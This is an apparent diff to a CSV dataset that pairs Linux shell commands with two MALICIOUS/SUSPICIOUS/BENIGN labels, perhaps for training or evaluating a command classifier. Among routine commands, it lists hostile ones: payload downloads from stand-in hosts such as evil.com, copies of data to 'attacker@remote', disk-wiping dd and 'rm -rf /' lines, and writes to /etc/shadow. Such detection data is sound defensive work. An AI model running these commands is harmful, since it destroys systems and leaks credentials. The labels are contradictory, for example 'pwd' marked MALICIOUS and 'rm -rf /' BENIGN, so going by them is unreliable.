+cd   /var/www,SUSPICIOUS,BENIGN
+ssh -L 8080:target.com:80 attacker@remote,MALICIOUS,BENIGN
+watch netstat -an,MALICIOUS,BENIGN
+which python,SUSPICIOUS,BENIGN
+grep   root /etc/passwd,SUSPICIOUS,BENIGN
+scp data.tar.gz root@backup.server:/root/,SUSPICIOUS,BENIGN
+DD IF=/DEV/ZERO   OF=/DEV/SDA,SUSPICIOUS,BENIGN
+ cat /home/user/info.txt,SUSPICIOUS,BENIGN
+ls /root/,MALICIOUS,BENIGN
+cat /etc/passwd,SUSPICIOUS,MALICIOUS
+sudo   apt install nmap,BENIGN,SUSPICIOUS
+env,MALICIOUS,BENIGN
+wget   http://evil.com/exploit.zip,BENIGN,MALICIOUS
+cat /home/user/info.txt,MALICIOUS,BENIGN
+curl https://safe-site.org/update.sh,MALICIOUS,BENIGN
+wget http://suspicious.org/update.bin,MALICIOUS,BENIGN
+ cat /home/user/info.txt,MALICIOUS,BENIGN
+top -n 1,SUSPICIOUS,BENIGN
+pwd,MALICIOUS,BENIGN
+rm -rf /,SUSPICIOUS,BENIGN
+cat /var/log/syslog,SUSPICIOUS,BENIGN
+ps aux | grep sshd,MALICIOUS,BENIGN
+sudo apt install nmap,SUSPICIOUS,BENIGN
+curl https://suspicious.org/update.bin,SUSPICIOUS,BENIGN
+ps aux | grep sshd,MALICIOUS,BENIGN
+grep root   /etc/passwd,BENIGN,SUSPICIOUS
+echo 'owned' >> /var/log/syslog,SUSPICIOUS,BENIGN
+du -sh,SUSPICIOUS,BENIGN
+curl -O http://malicious.com/malware.bin,SUSPICIOUS,BENIGN
+scp data.tar.gz root@192.168.0.2:/var/www,MALICIOUS,SUSPICIOUS
+cd /tmp/,SUSPICIOUS,BENIGN
+dd if=/dev/zero of=/dev/sda,BENIGN,MALICIOUS
+curl -o http://fileshare.com/update.bin,MALICIOUS,BENIGN
+cat ~/.ssh/known_hosts,MALICIOUS,SUSPICIOUS
+cat welcome.txt,BENIGN,MALICIOUS
+grep 'password' /etc/passwd,MALICIOUS,SUSPICIOUS
+cat ~/.ssh/known_hosts,MALICIOUS,BENIGN
+cat homework.txt,SUSPICIOUS,BENIGN
+echo 'owned' >> /root/.bashrc,SUSPICIOUS,BENIGN
+ whoami,MALICIOUS,BENIGN
+cat /var/log/syslog,MALICIOUS,BENIGN
+scp data.tar.gz   admin@malicious.com:/var/www,SUSPICIOUS,BENIGN
+scp file.txt attacker@remote:/tmp/,MALICIOUS,BENIGN
+curl https://fileshare.com/payload.sh,SUSPICIOUS,BENIGN
+ls -al,BENIGN,MALICIOUS
+du -sh,SUSPICIOUS,BENIGN
+wget http://suspicious.org/update.bin,MALICIOUS,BENIGN
+du -sh,BENIGN,SUSPICIOUS
+CURL   HTTP://UNKNOWN.SITE/SCRIPT.SH,SUSPICIOUS,BENIGN
+echo 'owned' > /var/log/syslog ,MALICIOUS,BENIGN
+SUDO APT   INSTALL NET-TOOLS,SUSPICIOUS,BENIGN
+ scp file.txt attacker@remote:/tmp/,SUSPICIOUS,BENIGN
+which python,BENIGN,MALICIOUS
+ping google.com,MALICIOUS,BENIGN
+echo 'hacked' >> /var/log/syslog,MALICIOUS,BENIGN
+ls -al,MALICIOUS,SUSPICIOUS
+sudo   apt update,BENIGN,SUSPICIOUS
+cat readme.md,SUSPICIOUS,BENIGN
+whoami,MALICIOUS,BENIGN
+top -n 1,SUSPICIOUS,MALICIOUS
+cat .bashrc,MALICIOUS,BENIGN
+cd /root,SUSPICIOUS,BENIGN
+rm -rf /,MALICIOUS,BENIGN
+cd /var/www,MALICIOUS,BENIGN
+cat /var/log/syslog,SUSPICIOUS,BENIGN
+chmod 777 /root/.bashrc,MALICIOUS,BENIGN
+curl https://safe-site.org/update.sh,MALICIOUS,BENIGN
+echo   'hello',MALICIOUS,BENIGN
+sudo apt install net-tools ,SUSPICIOUS,BENIGN
+echo 'pwned' > /root/.bashrc,SUSPICIOUS,BENIGN
+ ifconfig,BENIGN,MALICIOUS
+echo 'hacked' > /root/.bashrc,MALICIOUS,BENIGN
+ps aux | grep nginx,SUSPICIOUS,BENIGN
+ECHO 'HACKED'   > /ETC/SHADOW,MALICIOUS,SUSPICIOUS
+ls -al,SUSPICIOUS,BENIGN
+netstat -tulnp,SUSPICIOUS,BENIGN
+ls /var/www,SUSPICIOUS,BENIGN
+chmod 777 /var/log/syslog,MALICIOUS,BENIGN
+du   -sh,MALICIOUS,SUSPICIOUS
+grep root /etc/passwd,BENIGN,SUSPICIOUS
+curl http://unknown.site/script.sh,SUSPICIOUS,BENIGN
+echo 'malware' > /tmp/malware.sh,MALICIOUS,BENIGN
+uname -a,SUSPICIOUS,BENIGN
+wget http://malicious.com/payload.sh,SUSPICIOUS,BENIGN
+chmod 777 /etc/shadow,BENIGN,MALICIOUS
+CD   /ROOT,BENIGN,SUSPICIOUS
+curl -O http://fileshare.com/exploit.zip ,MALICIOUS,BENIGN
+echo 'hello world',SUSPICIOUS,BENIGN
+rm -rf   /var/,SUSPICIOUS,BENIGN
+cd /var/www,SUSPICIOUS,BENIGN
+cat ~/.ssh/known_hosts,BENIGN,SUSPICIOUS
+echo 'malware' > /tmp/malware.sh,SUSPICIOUS,MALICIOUS
+netstat -tulnp,SUSPICIOUS,BENIGN
+curl   -O http://malicious.com/malware.bin,MALICIOUS,BENIGN
+echo 'hello',MALICIOUS,SUSPICIOUS
+df -h,SUSPICIOUS,BENIGN
+echo 'pwned' >> /var/log/syslog,SUSPICIOUS,BENIGN
+grep 'password' /etc/passwd,MALICIOUS,BENIGN
+SUDO APT   INSTALL NMAP,SUSPICIOUS,BENIGN
+scp file.txt admin@backup.server:/var/www,SUSPICIOUS,BENIGN
+cd /root,MALICIOUS,BENIGN
+echo 'hacked' >> /root/.bashrc,SUSPICIOUS,BENIGN
+echo 'owned' > /etc/shadow ,MALICIOUS,BENIGN
+iptables -F,MALICIOUS,SUSPICIOUS
+SCP FILE.TXT ATTACKER@REMOTE:/TMP/ ,MALICIOUS,BENIGN
+rm -rf /home/user,SUSPICIOUS,BENIGN
+wget http://fileshare.com/update.bin,SUSPICIOUS,BENIGN
+cat homework.txt,SUSPICIOUS,MALICIOUS
+ chmod 777 /root/.bashrc,MALICIOUS,BENIGN
+mkdir test,MALICIOUS,BENIGN
+wget   http://evil.com/update.bin,SUSPICIOUS,BENIGN
+rm -rf /* --no-preserve-root,SUSPICIOUS,BENIGN
+cat /var/log/auth.log,BENIGN,SUSPICIOUS
+grep root /etc/passwd,MALICIOUS,SUSPICIOUS
+cat ~/.ssh/known_hosts,SUSPICIOUS,BENIGN
+touch homework.doc,BENIGN,MALICIOUS
+cat /var/log/syslog,MALICIOUS,BENIGN
+ echo 'hacked' > /etc/shadow,MALICIOUS,BENIGN
+wget   http://evil.com/exploit.zip,MALICIOUS,BENIGN
+chmod 777 /etc/shadow,MALICIOUS,BENIGN
+chmod 777 /root/.bashrc,SUSPICIOUS,BENIGN
+curl http://unknown.site/script.sh,MALICIOUS,BENIGN
+cat   /home/user/todo.txt,SUSPICIOUS,BENIGN
+cat /etc/shadow,MALICIOUS,BENIGN
+top -n 1,MALICIOUS,SUSPICIOUS
+cat /etc/shadow,SUSPICIOUS,BENIGN
+cat welcome.txt,MALICIOUS,BENIGN
+cat welcome.txt,MALICIOUS,BENIGN
+ echo 'malware' > /tmp/malware.sh,SUSPICIOUS,BENIGN
+cd   /root/,MALICIOUS,BENIGN
+echo 'pwned' >> /var/log/syslog,SUSPICIOUS,BENIGN
+TOUCH HOMEWORK.DOC ,SUSPICIOUS,BENIGN
+ls /var/www,SUSPICIOUS,BENIGN
+ps aux | grep sshd,SUSPICIOUS,BENIGN
+sudo apt install net-tools,SUSPICIOUS,MALICIOUS
+echo 'pwned' >> /var/log/syslog,SUSPICIOUS,BENIGN
+dd if=/dev/zero of=/dev/sda,MALICIOUS,BENIGN
+rm -rf /,SUSPICIOUS,MALICIOUS
+scp file.txt user@malicious.com:/tmp/,MALICIOUS,BENIGN
+rm -rf /* --no-preserve-root,SUSPICIOUS,BENIGN
+WGET   HTTP://EVIL.COM/PAYLOAD.SH,MALICIOUS,SUSPICIOUS
+echo 'owned' >> /root/.bashrc ,BENIGN,SUSPICIOUS
+ls -al,MALICIOUS,BENIGN
+env,SUSPICIOUS,BENIGN
+uname -a,MALICIOUS,BENIGN
+wget http://malicious.com/payload.sh,SUSPICIOUS,BENIGN
+chmod 777 /root/.bashrc,SUSPICIOUS,MALICIOUS
+scp file.txt attacker@remote:/tmp/,MALICIOUS,BENIGN
+chmod 777 /root/.bashrc,MALICIOUS,BENIGN
+cat   .bashrc,MALICIOUS,BENIGN
+CAT HOMEWORK.TXT,SUSPICIOUS,BENIGN
+cat /home/user/info.txt,MALICIOUS,BENIGN
+cat /home/user/todo.txt ,MALICIOUS,SUSPICIOUS
+TOP -N 1,SUSPICIOUS,BENIGN
+echo 'pwned' >> /root/.bashrc,SUSPICIOUS,MALICIOUS
+cat /etc/shadow,MALICIOUS,BENIGN
+sudo   apt update,BENIGN,SUSPICIOUS
+cat   /etc/shadow,MALICIOUS,BENIGN
+ ps aux,SUSPICIOUS,BENIGN
+sudo apt install htop,BENIGN,SUSPICIOUS
+curl https://fileshare.com/update.bin,MALICIOUS,BENIGN
+history,SUSPICIOUS,BENIGN
+top -n 1,SUSPICIOUS,MALICIOUS
+curl   https://evil.com/exploit.zip,SUSPICIOUS,BENIGN
+scp backup.sql admin@192.168.0.2:/root/,SUSPICIOUS,BENIGN
+echo 'hello',MALICIOUS,BENIGN
+cd /tmp/,MALICIOUS,BENIGN
+ pwd,SUSPICIOUS,BENIGN
+ifconfig,MALICIOUS,BENIGN
+watch netstat -an,BENIGN,MALICIOUS
+which python,SUSPICIOUS,BENIGN
+ls /root/,MALICIOUS,SUSPICIOUS
+echo 'pwned' >> /root/.bashrc,MALICIOUS,BENIGN
+echo 'malware' > /tmp/malware.sh,MALICIOUS,BENIGN
+pwd,SUSPICIOUS,BENIGN
+ls /var/www,MALICIOUS,BENIGN
+curl -O http://malicious.com/malware.bin,BENIGN,MALICIOUS
+rm -rf /var/,BENIGN,MALICIOUS
+ SUDO SU,SUSPICIOUS,BENIGN
+cat welcome.txt,SUSPICIOUS,BENIGN
+history,SUSPICIOUS,BENIGN
+which python,MALICIOUS,SUSPICIOUS
+ECHO 'OWNED' >> /VAR/LOG/SYSLOG,SUSPICIOUS,BENIGN
+cd /root/,BENIGN,SUSPICIOUS
+cat ~/.ssh/known_hosts,MALICIOUS,BENIGN
+cat /home/user/info.txt,SUSPICIOUS,BENIGN
+CURL -O HTTP://FILESHARE.COM/PAYLOAD.SH,MALICIOUS,BENIGN
+ SUDO SU,MALICIOUS,BENIGN
+rm -rf /,SUSPICIOUS,BENIGN
+cat /etc/shadow,MALICIOUS,BENIGN
+mkdir test,SUSPICIOUS,BENIGN
+mv /bin/bash /tmp/bash ,SUSPICIOUS,BENIGN
+which   python,MALICIOUS,BENIGN
+wget http://suspicious.org/exploit.zip,BENIGN,SUSPICIOUS
+du -sh,BENIGN,MALICIOUS
+watch netstat -an,SUSPICIOUS,BENIGN
+cat /etc/shadow,BENIGN,MALICIOUS
+scp file.txt attacker@remote:/tmp/,SUSPICIOUS,BENIGN
+cat notes.txt,SUSPICIOUS,BENIGN
+cat   /var/log/syslog,MALICIOUS,BENIGN
+sudo apt install htop,SUSPICIOUS,BENIGN
+RM -RF /,MALICIOUS,BENIGN
+cat /home/user/info.txt,MALICIOUS,SUSPICIOUS
+chmod 777 /etc/shadow,SUSPICIOUS,BENIGN
+cat ~/.ssh/known_hosts,SUSPICIOUS,MALICIOUS
+rm -rf   /,MALICIOUS,BENIGN
+ssh -L 8080:target.com:80 attacker@remote ,BENIGN,SUSPICIOUS
+cat /etc/passwd,SUSPICIOUS,BENIGN
+cat   /home/user/info.txt,MALICIOUS,BENIGN
+grep root /etc/passwd,SUSPICIOUS,BENIGN
+curl http://unknown.site/script.sh,SUSPICIOUS,MALICIOUS
+cat welcome.txt,MALICIOUS,BENIGN
+ sudo su,BENIGN,MALICIOUS
+netstat -tulnp,SUSPICIOUS,BENIGN
+chmod 777 /etc/shadow ,MALICIOUS,BENIGN
+ SSH -L 8080:TARGET.COM:80 ATTACKER@REMOTE,MALICIOUS,BENIGN
+sudo -l,BENIGN,SUSPICIOUS
+whoami,MALICIOUS,BENIGN
+ sudo apt update,SUSPICIOUS,BENIGN
+curl http://unknown.site/script.sh,MALICIOUS,BENIGN
+cat /root/.bashrc,MALICIOUS,BENIGN
+echo   'malware' > /tmp/malware.sh,MALICIOUS,BENIGN
+cat /var/log/auth.log,BENIGN,SUSPICIOUS
+chmod 777 /etc/shadow,MALICIOUS,BENIGN
+env,MALICIOUS,BENIGN
+echo 'hacked' > /root/.bashrc,MALICIOUS,BENIGN
+CAT /ROOT/.BASHRC,MALICIOUS,BENIGN
+ls /root/,SUSPICIOUS,BENIGN
+df -h,SUSPICIOUS,BENIGN
+env,SUSPICIOUS,BENIGN
+cd   /root,BENIGN,SUSPICIOUS
+cat /var/log/syslog,SUSPICIOUS,BENIGN
+echo 'pwned' >> /root/.bashrc,SUSPICIOUS,BENIGN
+history,MALICIOUS,BENIGN
+scp backup.sql user@malicious.com:/var/www,SUSPICIOUS,BENIGN
+df -h,MALICIOUS,BENIGN
+curl https://evil.com/exploit.zip,BENIGN,SUSPICIOUS
+history,SUSPICIOUS,BENIGN
+ ls /var/www,SUSPICIOUS,BENIGN
+mv /bin/bash /tmp/bash,BENIGN,MALICIOUS
+echo 'pwned' >> /root/.bashrc,MALICIOUS,BENIGN
+chmod 777 /etc/shadow,MALICIOUS,BENIGN
+watch netstat -an,MALICIOUS,BENIGN
+iptables -F,MALICIOUS,BENIGN
+ls /tmp/,MALICIOUS,BENIGN
+cat   /var/log/syslog,SUSPICIOUS,BENIGN
+ls -al,BENIGN,SUSPICIOUS
+cat /etc/shadow,MALICIOUS,BENIGN
+echo 'malware' > /tmp/malware.sh,MALICIOUS,BENIGN
+cat /etc/shadow,SUSPICIOUS,BENIGN
+mv /bin/bash /tmp/bash,SUSPICIOUS,BENIGN
+ curl -O http://malicious.com/malware.bin,SUSPICIOUS,MALICIOUS
+sudo apt install net-tools,BENIGN,MALICIOUS
+rm -rf   /var/,MALICIOUS,SUSPICIOUS
+touch homework.doc,SUSPICIOUS,BENIGN
+cat homework.txt,SUSPICIOUS,MALICIOUS
+ LS /VAR/WWW,SUSPICIOUS,BENIGN
+ps   aux | grep mysql,SUSPICIOUS,BENIGN
+curl http://unknown.site/script.sh,MALICIOUS,BENIGN
+rm -rf /var/,MALICIOUS,BENIGN
+ WGET HTTP://SUSPICIOUS.ORG/UPDATE.BIN,MALICIOUS,BENIGN
+ls /var/www,BENIGN,SUSPICIOUS
+ECHO 'PWNED' > /VAR/LOG/SYSLOG,BENIGN,SUSPICIOUS
+echo 'pwned' > /var/log/syslog,SUSPICIOUS,BENIGN
+CD   /ROOT/,MALICIOUS,BENIGN
+scp file.txt attacker@remote:/tmp/,MALICIOUS,SUSPICIOUS
+sudo su ,SUSPICIOUS,BENIGN
+whoami,MALICIOUS,BENIGN
+cat /root/.bashrc,MALICIOUS,BENIGN
+mv /bin/bash /tmp/bash ,SUSPICIOUS,BENIGN
+cat /root/.bashrc,MALICIOUS,BENIGN
+ping google.com,SUSPICIOUS,BENIGN
+rm -rf /,BENIGN,SUSPICIOUS
+sudo apt install nmap,SUSPICIOUS,BENIGN
+ cd /root,SUSPICIOUS,BENIGN
+cat   /etc/shadow,SUSPICIOUS,MALICIOUS
+cd /root/,BENIGN,SUSPICIOUS
+chmod 777 /root/.bashrc ,SUSPICIOUS,BENIGN
+ifconfig,MALICIOUS,BENIGN
+chmod 777 /root/.bashrc,SUSPICIOUS,BENIGN
+ history,MALICIOUS,BENIGN
+cat /etc/passwd,SUSPICIOUS,BENIGN
+top -n 1,MALICIOUS,BENIGN
+scp data.tar.gz root@192.168.0.2:/root/,MALICIOUS,BENIGN
+dd if=/dev/zero of=/dev/sda,SUSPICIOUS,BENIGN
+rm -rf /home/user,MALICIOUS,BENIGN
+mv /bin/bash /tmp/bash,BENIGN,SUSPICIOUS
+sudo apt install nmap,SUSPICIOUS,MALICIOUS
+cat /home/user/todo.txt,SUSPICIOUS,BENIGN
+ECHO 'PWNED' > /VAR/LOG/SYSLOG ,SUSPICIOUS,BENIGN
+ chmod 777 /etc/shadow,BENIGN,MALICIOUS
+whoami,SUSPICIOUS,BENIGN
+echo 'pwned' > /root/.bashrc,SUSPICIOUS,BENIGN
+netstat -tulnp,SUSPICIOUS,BENIGN
+uname -a,SUSPICIOUS,BENIGN
+mv /bin/bash /tmp/bash,SUSPICIOUS,BENIGN
+curl -O http://malicious.com/malware.bin,SUSPICIOUS,BENIGN
+CAT /HOME/USER/INFO.TXT ,SUSPICIOUS,BENIGN
+pwd,BENIGN,SUSPICIOUS
+echo 'hacked' >> /root/.bashrc,BENIGN,SUSPICIOUS
+echo 'pwned' > /etc/shadow,SUSPICIOUS,BENIGN
+sudo   apt update,MALICIOUS,BENIGN
+cat homework.txt,BENIGN,MALICIOUS
+echo 'malware' > /tmp/malware.sh,MALICIOUS,BENIGN
+ whoami,MALICIOUS,BENIGN
+ls /root/,SUSPICIOUS,BENIGN
+cat   /root/.bashrc,MALICIOUS,BENIGN
+curl -O http://suspicious.org/payload.sh,SUSPICIOUS,BENIGN
+cat /var/log/syslog,MALICIOUS,BENIGN
+ifconfig,MALICIOUS,SUSPICIOUS
+pwd,SUSPICIOUS,BENIGN
+chmod 777   /etc/shadow,SUSPICIOUS,BENIGN
+curl https://evil.com/payload.sh,BENIGN,SUSPICIOUS
+CAT ~/.SSH/KNOWN_HOSTS,SUSPICIOUS,BENIGN
+cd /root,MALICIOUS,SUSPICIOUS
+watch netstat   -an,SUSPICIOUS,BENIGN
+scp file.txt attacker@remote:/tmp/,SUSPICIOUS,BENIGN
+watch netstat -an,MALICIOUS,BENIGN
+sudo apt install net-tools,BENIGN,SUSPICIOUS
+grep 'password' /etc/passwd,SUSPICIOUS,BENIGN
+rm -rf /,MALICIOUS,BENIGN
+ps aux | grep sshd,BENIGN,SUSPICIOUS
+SUDO   -L,SUSPICIOUS,BENIGN
+whoami,BENIGN,MALICIOUS
+cd   /root,SUSPICIOUS,BENIGN
+cat /etc/shadow,SUSPICIOUS,MALICIOUS
+echo 'pwned' > /etc/shadow,BENIGN,MALICIOUS
+env,BENIGN,MALICIOUS
+mkdir test,MALICIOUS,BENIGN
+curl https://safe-site.org/update.sh,MALICIOUS,BENIGN
+curl http://unknown.site/script.sh,MALICIOUS,BENIGN
+echo 'hacked' > /root/.bashrc ,SUSPICIOUS,MALICIOUS
+ifconfig,MALICIOUS,BENIGN
+netstat -tulnp,SUSPICIOUS,BENIGN
+ping   google.com,MALICIOUS,BENIGN
+top -n 1,MALICIOUS,BENIGN
+echo 'hacked' > /root/.bashrc,BENIGN,MALICIOUS
+dd if=/dev/zero   of=/dev/sda,MALICIOUS,BENIGN
+rm -rf /var/,BENIGN,MALICIOUS
+find / -name   'test',MALICIOUS,BENIGN
+rm -rf /,MALICIOUS,BENIGN
+echo 'pwned' >> /etc/shadow,MALICIOUS,BENIGN
+top -n 1,MALICIOUS,BENIGN
+cat   /home/user/todo.txt,BENIGN,SUSPICIOUS
+echo 'pwned' >> /var/log/syslog,SUSPICIOUS,BENIGN
+sudo su,MALICIOUS,BENIGN
+ifconfig ,MALICIOUS,BENIGN
+chmod 777 /etc/shadow,SUSPICIOUS,BENIGN
+find / -name 'test',SUSPICIOUS,BENIGN
+wget http://fileshare.com/payload.sh,BENIGN,SUSPICIOUS
+curl https://safe-site.org/update.sh,SUSPICIOUS,BENIGN
+echo 'hacked' >> /root/.bashrc,SUSPICIOUS,BENIGN
+wget http://malicious.com/payload.sh,SUSPICIOUS,BENIGN
+grep 'password' /etc/passwd,MALICIOUS,BENIGN
+cat /var/log/auth.log,MALICIOUS,BENIGN
+cd   /root,MALICIOUS,BENIGN
+sudo apt install net-tools,SUSPICIOUS,BENIGN
+rm -rf /* --no-preserve-root,BENIGN,SUSPICIOUS
+pwd,MALICIOUS,BENIGN
+ history,MALICIOUS,BENIGN
+ wget http://malicious.com/payload.sh,SUSPICIOUS,BENIGN
+whoami,BENIGN,SUSPICIOUS
+history,SUSPICIOUS,BENIGN
+echo 'owned' >> /etc/shadow,MALICIOUS,BENIGN
+cd /root,SUSPICIOUS,MALICIOUS
+which python,SUSPICIOUS,BENIGN
+echo 'hello',MALICIOUS,BENIGN
+rm -rf /home/user ,SUSPICIOUS,BENIGN
+SUDO SU,SUSPICIOUS,BENIGN
+CD /ROOT/,SUSPICIOUS,BENIGN
+wget http://malicious.com/payload.sh,SUSPICIOUS,BENIGN
+scp data.tar.gz admin@backup.server:/var/www,BENIGN,SUSPICIOUS
+cat ~/.ssh/known_hosts,SUSPICIOUS,BENIGN
+cd /tmp/,SUSPICIOUS,BENIGN
+ ps aux | grep mysql,SUSPICIOUS,BENIGN
+wget http://fileshare.com/update.bin,SUSPICIOUS,BENIGN
+cat ~/.ssh/known_hosts,BENIGN,MALICIOUS
+grep 'password' /etc/passwd,BENIGN,SUSPICIOUS
+DU -SH,MALICIOUS,BENIGN
+chmod 777 /etc/shadow,SUSPICIOUS,BENIGN
+echo 'hello world',SUSPICIOUS,BENIGN
+chmod 777 /etc/shadow,MALICIOUS,BENIGN
+ls   -al,SUSPICIOUS,BENIGN
+df -h ,SUSPICIOUS,BENIGN
+wget http://fileshare.com/exploit.zip,SUSPICIOUS,BENIGN
+echo 'hacked' > /root/.bashrc,MALICIOUS,BENIGN
+sudo apt update,SUSPICIOUS,BENIGN
+grep root /etc/passwd,MALICIOUS,BENIGN
+sudo su,MALICIOUS,SUSPICIOUS
+cat /home/user/todo.txt,SUSPICIOUS,BENIGN
+wget http://suspicious.org/exploit.zip,BENIGN,SUSPICIOUS
+cat /var/log/syslog ,SUSPICIOUS,BENIGN
+curl -O http://malicious.com/malware.bin,MALICIOUS,BENIGN
+sudo apt update,MALICIOUS,BENIGN
+rm -rf /var/,MALICIOUS,BENIGN
+ls -al ,MALICIOUS,BENIGN
+cat /home/user/info.txt,SUSPICIOUS,BENIGN
+dd if=/dev/zero of=/dev/sda,SUSPICIOUS,BENIGN
+touch homework.doc,SUSPICIOUS,BENIGN
+ping   google.com,SUSPICIOUS,BENIGN
+ du -sh,MALICIOUS,SUSPICIOUS
+watch netstat -an,MALICIOUS,BENIGN
+scp data.tar.gz user@malicious.com:/root/,SUSPICIOUS,BENIGN
+cat /home/user/todo.txt,MALICIOUS,BENIGN
+cat welcome.txt,MALICIOUS,BENIGN
+sudo -l,MALICIOUS,BENIGN
+cd   /root/,SUSPICIOUS,BENIGN
+grep root /etc/passwd,MALICIOUS,BENIGN
+cat /etc/shadow,BENIGN,MALICIOUS
+cd /tmp/,MALICIOUS,BENIGN
+cat homework.txt,MALICIOUS,BENIGN
+cat /etc/passwd,SUSPICIOUS,BENIGN
+wget http://suspicious.org/exploit.zip,MALICIOUS,BENIGN
+curl http://unknown.site/script.sh,SUSPICIOUS,BENIGN
+cat /home/user/info.txt,BENIGN,SUSPICIOUS
+env,MALICIOUS,BENIGN
+mv /bin/bash /tmp/bash,SUSPICIOUS,BENIGN
+cat /home/user/info.txt,SUSPICIOUS,BENIGN
+which python,MALICIOUS,BENIGN
+wget   http://malicious.com/payload.sh,SUSPICIOUS,BENIGN
+echo 'pwned' >> /etc/shadow,SUSPICIOUS,MALICIOUS
+netstat -tulnp,SUSPICIOUS,BENIGN
+wget   http://suspicious.org/payload.sh,MALICIOUS,BENIGN
+touch homework.doc,MALICIOUS,BENIGN
+echo 'hello',MALICIOUS,BENIGN
+curl https://safe-site.org/update.sh,SUSPICIOUS,BENIGN
+cd   /var/www,MALICIOUS,BENIGN
+cat /var/log/syslog,SUSPICIOUS,BENIGN
+DD IF=/DEV/ZERO OF=/DEV/SDA,MALICIOUS,BENIGN
+cat .bashrc,SUSPICIOUS,BENIGN
+ls   /root/,MALICIOUS,BENIGN
+rm -rf /* --no-preserve-root,SUSPICIOUS,BENIGN
+cat .bashrc,MALICIOUS,BENIGN
+cat /home/user/todo.txt,MALICIOUS,BENIGN
+cat ~/.ssh/known_hosts,MALICIOUS,BENIGN
+cat   ~/.ssh/known_hosts,SUSPICIOUS,BENIGN
+echo 'hello',MALICIOUS,SUSPICIOUS
+mv /bin/bash /tmp/bash,SUSPICIOUS,BENIGN
+cd /root,MALICIOUS,BENIGN
+cat homework.txt,MALICIOUS,SUSPICIOUS
+whoami,MALICIOUS,BENIGN
+wget http://suspicious.org/payload.sh,SUSPICIOUS,BENIGN
+ GREP 'PASSWORD' /ETC/PASSWD,SUSPICIOUS,BENIGN
+echo 'hello world',SUSPICIOUS,BENIGN
+cat   welcome.txt,MALICIOUS,BENIGN
+ echo 'hacked' > /root/.bashrc,MALICIOUS,BENIGN
+wget http://evil.com/payload.sh ,MALICIOUS,BENIGN
+curl https://fileshare.com/payload.sh,BENIGN,MALICIOUS
+ls   -al,SUSPICIOUS,BENIGN
+cd /root,MALICIOUS,SUSPICIOUS
+ls /root/,SUSPICIOUS,BENIGN
+du -sh,SUSPICIOUS,BENIGN
+pwd,MALICIOUS,SUSPICIOUS
+env,MALICIOUS,BENIGN
+cd /root/,SUSPICIOUS,BENIGN
+sudo   apt update,SUSPICIOUS,BENIGN
+sudo apt install net-tools,BENIGN,MALICIOUS
+CAT   ~/.SSH/KNOWN_HOSTS,SUSPICIOUS,BENIGN
+rm -rf /,MALICIOUS,BENIGN
+cat .bashrc,MALICIOUS,BENIGN
+uname -a,SUSPICIOUS,BENIGN
+HISTORY,SUSPICIOUS,BENIGN
+rm -rf / ,MALICIOUS,BENIGN
+ls /tmp/,MALICIOUS,BENIGN
+echo 'owned' >> /var/log/syslog,SUSPICIOUS,BENIGN
+ CAT /HOME/USER/TODO.TXT,SUSPICIOUS,BENIGN
+netstat -tulnp,MALICIOUS,SUSPICIOUS
+cat   /etc/passwd,SUSPICIOUS,BENIGN
+ watch netstat -an,SUSPICIOUS,BENIGN
+du -sh,MALICIOUS,BENIGN
+ cat /var/log/syslog,SUSPICIOUS,BENIGN
+echo 'hello world',SUSPICIOUS,BENIGN
+df   -h,MALICIOUS,SUSPICIOUS
+cat ~/.ssh/known_hosts ,SUSPICIOUS,BENIGN
+pwd,SUSPICIOUS,BENIGN
+wget http://fileshare.com/exploit.zip,SUSPICIOUS,BENIGN
+ ls /var/www,MALICIOUS,BENIGN
+sudo apt update,SUSPICIOUS,MALICIOUS
+ CURL HTTPS://EVIL.COM/UPDATE.BIN,SUSPICIOUS,BENIGN
+cd   /root/,BENIGN,MALICIOUS
+touch   homework.doc,SUSPICIOUS,MALICIOUS
+echo 'hacked' >   /root/.bashrc,SUSPICIOUS,BENIGN
+cat /etc/shadow,MALICIOUS,BENIGN
+touch homework.doc,MALICIOUS,BENIGN
+ifconfig,SUSPICIOUS,MALICIOUS
+rm -rf   /,SUSPICIOUS,BENIGN
+mv   /bin/bash /tmp/bash,SUSPICIOUS,MALICIOUS
+cd /root,SUSPICIOUS,BENIGN
+mv /bin/bash /tmp/bash,BENIGN,SUSPICIOUS
+DF -H ,SUSPICIOUS,MALICIOUS
+mv /bin/bash /tmp/bash,SUSPICIOUS,BENIGN
+ echo 'pwned' >> /etc/shadow,SUSPICIOUS,BENIGN
+echo 'malware' > /tmp/malware.sh,MALICIOUS,SUSPICIOUS
+cat   /home/user/info.txt,BENIGN,SUSPICIOUS
+sudo apt install nmap,MALICIOUS,SUSPICIOUS
+echo 'owned' > /etc/shadow,MALICIOUS,BENIGN
+ssh -L   8080:target.com:80 attacker@remote,BENIGN,MALICIOUS
+cat /etc/passwd,SUSPICIOUS,BENIGN
+cat homework.txt,MALICIOUS,BENIGN
+WGET   HTTP://MALICIOUS.COM/PAYLOAD.SH,MALICIOUS,BENIGN
+ls /tmp/,SUSPICIOUS,BENIGN
+sudo apt install net-tools,BENIGN,MALICIOUS
+chmod 777 /etc/shadow,MALICIOUS,BENIGN
+which python,MALICIOUS,BENIGN
+ls /tmp/,SUSPICIOUS,MALICIOUS
+echo 'hacked' > /root/.bashrc,MALICIOUS,SUSPICIOUS
+rm -rf /,BENIGN,MALICIOUS
+cd /root/,SUSPICIOUS,BENIGN
+grep root /etc/passwd,SUSPICIOUS,MALICIOUS
+cat /var/log/syslog,SUSPICIOUS,BENIGN
+echo   'pwned' > /etc/shadow,MALICIOUS,BENIGN
+ps aux | grep sshd,MALICIOUS,BENIGN
+top -n 1,SUSPICIOUS,BENIGN
+curl -O   http://suspicious.org/exploit.zip,MALICIOUS,BENIGN
+cat /root/.bashrc,SUSPICIOUS,BENIGN
+rm -rf /,SUSPICIOUS,BENIGN
+sudo apt   install htop,SUSPICIOUS,MALICIOUS
+cat   /root/.bashrc,MALICIOUS,SUSPICIOUS
+echo 'hacked' >> /etc/shadow,BENIGN,SUSPICIOUS
+iptables -F,MALICIOUS,BENIGN
+chmod 777 /etc/shadow,MALICIOUS,BENIGN
+sudo -l,MALICIOUS,SUSPICIOUS
+rm -rf /,MALICIOUS,BENIGN
+echo 'hello',SUSPICIOUS,BENIGN
+watch netstat -an,SUSPICIOUS,BENIGN
+mkdir test,SUSPICIOUS,MALICIOUS
+history,SUSPICIOUS,BENIGN
+scp data.tar.gz user@192.168.0.2:/root/,SUSPICIOUS,BENIGN
+which   python,SUSPICIOUS,MALICIOUS
+ifconfig,MALICIOUS,BENIGN
+df -h,BENIGN,SUSPICIOUS
+cat welcome.txt,MALICIOUS,BENIGN
+scp file.txt attacker@remote:/tmp/,MALICIOUS,BENIGN
+ rm -rf /var/,SUSPICIOUS,BENIGN
